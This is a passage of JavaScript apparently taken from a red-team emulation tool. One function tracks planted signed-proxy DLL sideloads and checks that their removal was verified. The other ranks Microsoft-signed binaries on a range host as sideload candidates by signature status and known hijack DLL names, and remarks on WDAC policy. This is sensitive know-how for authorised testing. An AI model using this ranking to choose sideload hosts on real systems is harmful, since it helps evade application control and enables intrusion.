        if (t.removalVerified === true) {
          if (open.delete(k)) closed.push({ agentId: e.agentId, name: n });
          else closed.push({ agentId: e.agentId, name: n, untracked: true });
        } else {
          const rec = open.get(k) || { agentId: e.agentId, name: n, technique: t.technique || null };
          rec.escalated = true; // removal attempted but NOT verified — the loud loose end
          open.set(k, rec);
        }
      }
    } else if (e.type === 'execproxy.status' && e.clean === true) {
      for (const [k, rec] of [...open.entries()]) if (rec.agentId === e.agentId) { open.delete(k); closed.push({ ...rec, via: 'sweep' }); }
    } else if (e.type === 'execproxy.status' && e.clean === false && Array.isArray(e.open)) {
      for (const t of e.open) {
        if (!t) continue;
        open.set(key(e.agentId, t.name), { agentId: e.agentId, name: t.name || null, technique: t.technique || null, escalated: true });
      }
    }
  }
  const openList = [...open.values()];
  return {
    clean: openList.length === 0,
    open: openList,
    closed,
    note: openList.length === 0
      ? 'no unverified signed-proxy plants remain — the engagement MAY be called clean'
      : openList.length + ' execproxy plant(s) are still present or removal-unverified — the engagement CANNOT be called clean (execproxy-remove + execproxy-status until this set is empty)',
  };
}

// ——— HOST CANDIDATE DISCOVERY (the pure ranker; RECON ONLY) ———
// Rank discovery rows (from tools/execproxy.mjs's read-only Get-AuthenticodeSignature
// sweep, or a fixture) for the sideload class. Score: present + validly signed +
// Microsoft signer + known hijack names. The verdict is always 'candidate' — a host
// that actually loads a planted name on a target build is a MEASURED fact
// (edrview pairing), never a claim.
export function rankHostCandidates(rows) {
  const out = [];
  for (const r of rows || []) {
    if (!r || typeof r !== 'object') continue;
    const path = String(r.path || '');
    if (!path) continue;
    const present = r.present === true;
    const sigValid = String(r.sigStatus || '').toLowerCase() === 'valid';
    const signer = String(r.signer || '');
    const microsoft = /microsoft/i.test(signer);
    const names = Array.isArray(r.hijackNames) ? r.hijackNames.filter((n) => EXECPROXY_HIJACK_NAMES.includes(String(n).toLowerCase())) : [];
    let score = 0;
    if (present) score += 1;
    if (sigValid) score += 2;
    if (microsoft) score += 2;
    if (names.length) score += 2;
    const reasons = [];
    if (!present) reasons.push('not present on the range host');
    if (present && !sigValid) reasons.push('signature not Valid (' + (r.sigStatus || 'unknown') + ')');
    if (present && sigValid && !microsoft) reasons.push('validly signed but NOT Microsoft (' + (signer || 'unknown signer') + ') — WDAC policy dependent');
    if (present && !names.length) reasons.push('no stage-1 hijack names known for this host');
    if (present && sigValid && microsoft && names.length) reasons.push('Microsoft-signed, present, hijack-name candidate: ' + names.join(', '));
    out.push({
      path, present, sigStatus: r.sigStatus || null, signer: signer || null,
      hijackNames: names, score,
      verdict: present && sigValid && microsoft && names.length ? 'candidate' : 'unsuitable',
      note: reasons.join('; ') + ' — a candidate is a hypothesis for the MEASURED plant/run/edrview loop, never a claim of hijackability',
    });
  }
  out.sort((a, b) => b.score - a.score || a.path.localeCompare(b.path));
  return out;
}
